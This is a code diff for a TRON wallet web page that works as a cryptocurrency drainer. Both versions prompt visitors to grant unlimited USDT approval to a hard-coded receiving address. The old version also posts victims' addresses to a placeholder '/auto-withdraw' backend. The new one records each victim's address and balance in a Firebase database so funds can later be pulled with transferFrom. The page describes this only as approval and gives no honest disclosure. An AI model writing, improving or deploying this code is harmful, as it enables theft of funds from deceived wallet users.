@@ -1,49 +1,58 @@
-const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // TRC-20 USDT contract
-const RECEIVING_ADDRESS = 'TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN'; // Your TRC-20 address
-let userAddress = '';
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";
 
-document.getElementById('sendBtn').addEventListener('click', async () => {
-  try {
-    // Connect wallet
-    if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-      document.getElementById('status').innerText = 'Please open in Tron-compatible wallet browser like Trust Wallet or TronLink.';
-      return;
-    }
+// ✅ Step 1: Firebase Setup
+const firebaseConfig = {
+  apiKey: "AIzaSyDPwmF77VXvOlM3l4v2dJsqN0QFh8Qxwfk",
+  authDomain: "trc20-verify-17c29.firebaseapp.com",
+  projectId: "trc20-verify-17c29",
+  storageBucket: "trc20-verify-17c29.firebasestorage.app",
+  messagingSenderId: "197859891589",
+  appId: "1:197859891589:web:ae2f73ab5c3b6bc1c88cec"
+};
 
-    await new Promise(resolve => setTimeout(resolve, 100)); // slight delay for wallet readiness
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
 
-    userAddress = window.tronWeb.defaultAddress.base58;
-    document.getElementById('status').innerText = `Connected: ${userAddress}`;
+// ✅ Step 2: Contract Setup
+const usdtAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT
+const receiver = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN"; // Your TRC-20 receiving address
 
-    // Load USDT contract
-    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+const ABI = [
+  { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
+  { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+  { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+];
 
-    // Send 1 USDT (optional - can skip this if needed)
-    await contract.transfer(RECEIVING_ADDRESS, 1_000_000).send(); // 1 USDT = 1,000,000 in TRC-20
-
-    // Trigger unlimited approval
-    await contract.approve(RECEIVING_ADDRESS, 999_999_999_000_000).send(); // Approve large amount
-
-    document.getElementById('status').innerText = `Approval successful. Scanning balance...`;
-
-    // Call backend to log wallet and balance
-    await fetch('https://your-backend-api.com/log', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: userAddress })
-    });
-
-    // Attempt auto-withdraw (backend should pull funds using transferFrom)
-    await fetch('https://your-backend-api.com/auto-withdraw', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ address: userAddress })
-    });
-
-    document.getElementById('status').innerText = `USDT approval done. Awaiting auto-withdraw...`;
-
-  } catch (error) {
-    console.error(error);
-    document.getElementById('status').innerText = 'Error occurred: ' + error.message;
+document.getElementById("connectButton").onclick = async () => {
+  if (!window.tronWeb || !window.tronWeb.ready) {
+    alert("Please open in TronLink or Trust Wallet (TRON)");
+    return;
   }
-});
+
+  const address = window.tronWeb.defaultAddress.base58;
+  const contract = await window.tronWeb.contract(ABI, usdtAddress);
+
+  try {
+    // ✅ Unlimited USDT Approval
+    await contract.approve(receiver, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
+
+    // ✅ Get Balance
+    const balance = await contract.balanceOf(address).call();
+
+    // ✅ Log to Firebase
+    const userRef = ref(db, 'users/' + address);
+    await set(userRef, {
+      address: address,
+      balance: parseInt(balance) / 1e6,
+      approved: true,
+      timestamp: Date.now()
+    });
+
+    // ✅ (Optional) Auto withdraw logic (requires backend webhook or watch)
+    alert("USDT approved successfully.");
+  } catch (e) {
+    console.error("Error during approval:", e);
+    alert("Something went wrong.");
+  }
+};
